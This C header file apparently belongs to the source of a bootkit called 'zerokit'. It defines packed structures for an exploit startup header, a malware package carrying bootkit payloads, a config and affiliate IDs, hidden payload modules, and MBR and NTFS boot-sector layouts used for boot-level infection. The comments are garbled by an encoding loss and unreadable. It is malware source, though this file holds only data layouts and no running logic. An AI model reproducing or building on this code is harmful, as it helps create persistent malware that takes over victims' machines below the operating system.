#ifndef __MOD_H_
#define __MOD_H_

#define MODF_COMPRESSED 0x00000001

// ��������� ���� ��������.

#pragma pack(push, 1)

typedef struct _exploit_startup_header
{
    union {
        wchar_t filePath[256];
        uint8_t buffer[512];
    } u;
} exploit_startup_header_t, *pexploit_startup_header_t;

typedef struct _zerokit_header
{
    uint32_t sizeOfPack;        // ������ ����� ����, ������� ������ ����� ���������, ������ ������� � ������ ���� �������, ������ ��������������� ������� � ������ (���� �� ����).
    uint32_t sizeOfBootkit;     // ������ �������, ������� ��������� ����� ����� exploit_startup_header_t.
    uint32_t sizeOfBkPayload32; // ������ 32-������� ���������� �������.
    uint32_t sizeOfBkPayload64; // ������ 64-������� ���������� �������.
    uint32_t sizeOfConfig;      // ������ ���������������� �������, ������� ����������� ����� ����� 64-������ ������ ��������.
    uint32_t sizeOfBundle;      // ������ �����, ������� ����� ���� ��������� ���������, �� ����� ��������� ����� �� ���������������� ��������.
    uint32_t affid;
    uint32_t subid;
} zerokit_header_t, *pzerokit_header_t;

typedef struct _loader32_info
{
    uint64_t loaderOffset;
    uint32_t loaderSize;
    uint32_t startSector;
    uint32_t bootkitReserved1;
} loader32_info_t, *ploader32_info_t;

typedef struct _loader64_info
{
    uint64_t loaderOffset;
    uint32_t loaderSize;
    uint32_t startSector;
    uint64_t bootkitReserved1;
} loader64_info_t, *ploader64_info_t;

typedef struct _mods_pack_header
{
    uint32_t sizeOfPack;    // ������ ����, ��� ����� ������� ���������.
    uint64_t crc;           // 64-������ ����������� ����� ����������� �� ���� mod-�.
    uint32_t bkBaseDiff;    // ������� ����� ������� ���������� � ������� �������, ������� ��������� ����� ������.
} mods_pack_header_t, *pmods_pack_header_t;

typedef struct _mod_header
{
	uint32_t fakeBase;      // �������� ���� ��� ���������� �������� ��������.
	uint64_t crc;           // 64-������ ����������� ����� ����������� �� ���� mod-�.
	uint32_t sizeOfMod;     // ������ ����, ������� ���������� ����� ����� ������� ��������� (����� ���� �������� ���� ����� ����������).
    uint32_t sizeOfModReal; // �������� ������ ����.
	uint32_t entryPointRVA; // RVA ����� ����� ������������ ���������.
	uint32_t confOffset;    // �������� � ������ �� ������������.
    uint32_t confSize;      // ������ ������������.
	uint32_t flags;         // �����
	uint32_t reserved3;
} mod_header_t, *pmod_header_t;

typedef struct _partition_table_entry
{
    uint8_t  active;        // ��������� �������� - ���������, �������� �� ��� �������� ��������: 00 � �� ������������ ��� ��������; 80 � �������� ������.
    uint8_t  startHead;     // ��������� �������.
    uint16_t startCyl;      // ���� 0..5 - ��������� ������. ���� 6..15 - ��������� �������.
    uint8_t  sysID;         // ������������� �������, ������������ ��� ����.
    uint8_t  endHead;       // �������� �������.
    uint16_t endCyl;        // ���� 0..5 - �������� ������. ���� 6..15 - �������� �������.
    uint32_t startSect;     // �������� �� ������ ����� �� ������ ����, ���������� � ����� ��������.
    uint32_t totalSects;    // ����� �������� � ������ ����.
} partition_table_entry_t, *ppartition_table_entry_t;

typedef struct _bk_mbr
{
    uint8_t opcodes[432];
    union {
        uint8_t data2[78];
        struct
        {
            uint8_t pad[14];
            partition_table_entry_t pt[4];
        };
    };
    uint16_t magic;
} bk_mbr_t, *pbk_mbr_t;

typedef struct _bios_dap
{
    uint8_t  size;
    uint8_t  unk;
    uint16_t numb;
    uint16_t dst_off;
    uint16_t dst_sel;
    uint64_t sector;
} bios_dap_t, *pbios_dap_t;

typedef struct _bios_parameter_block
{
    /*0x0b*/uint16_t bytesPerSector;    // ������ �������, � ������.
    /*0x0d*/uint8_t  sectorsPerCluster; // �������� � ��������.
    /*0x0e*/uint16_t reservedSectors;   // ������ ���� ����.
    /*0x10*/uint8_t  fats;              // ������ ���� ����.
    /*0x11*/uint16_t root_entries;      // ������ ���� ����.
    /*0x13*/uint16_t sectors;			// ������ ���� ����.
    /*0x15*/uint8_t  mediaType;		    // ��� ��������, 0xf8 = hard disk.
    /*0x16*/uint16_t sectorsPerFat;		// ������ ���� ����.
    /*0x18*/uint16_t sectorsPerTrack;	// �� ������������.
    /*0x1a*/uint16_t heads;			    // �� ������������.
    /*0x1c*/uint32_t hiddenSectors;		// ���������� ������� �������� �������������� ����.
    /*0x20*/uint32_t largeSectors;		// ������ ���� ����.
    /* sizeof() = 25 (0x19) bytes */
} bios_parameter_block_t, *pbios_parameter_block_t;

typedef struct _bk_ntfs_vbr
{
    /*0x00*/uint8_t jump[3];                // ������� �� ����������� ���.
    /*0x03*/char oemName[8];                // ��������� "NTFS    ".
    /*0x0b*/bios_parameter_block_t bpb;
    /*0x24*/uint8_t physicalDrive;	    	// �� ������������.
    /*0x25*/uint8_t currentHead;		    // �� ������������.
    /*0x26*/uint8_t extendedBootSignature;  // �� ������������.
    /*0x27*/uint8_t reserved2;              // �� ������������.
    /*0x28*/uint64_t totalSectors;      	// ���������� �������� �� ����.
    /*0x30*/uint64_t mftStartCluster;       // ��������� ������� MFT.
    /*0x38*/uint64_t mftMirrStartCluster;   // ��������� ������� ����� MFT.
    /*0x40*/char clustersPerMftRecord;      // ������ MFT ������ � ���������.
    /*0x41*/uint8_t reserved0[3];           // ���������������.
    /*0x44*/char clustersPerIndexRecord;    // ������ ��������� ������ � ���������.
    /*0x45*/uint8_t reserved1[3];           // ���������������.
    /*0x48*/uint64_t volumeSerialNumber;    // ���������� �������� ����� ����.
    /*0x50*/uint32_t checksum;              // �� ������������.
    /*0x54*/uint8_t  bootstrap[426];		// �����������-���.
    /*0x1fe*/uint16_t endOfSectorMarker;	// ����� ������������ �������, ��������� 0xAA55.
    /* sizeof() = 512 (0x200) bytes */
} bk_ntfs_vbr_t, *pbk_ntfs_vbr_t;

#pragma pack(pop)

typedef long (*FnmodEntryPoint)(uintptr_t modBase, pvoid_t pGlobalBlock);

#define FREE_SPACE_AFTER 7

#endif // __MOD_H_
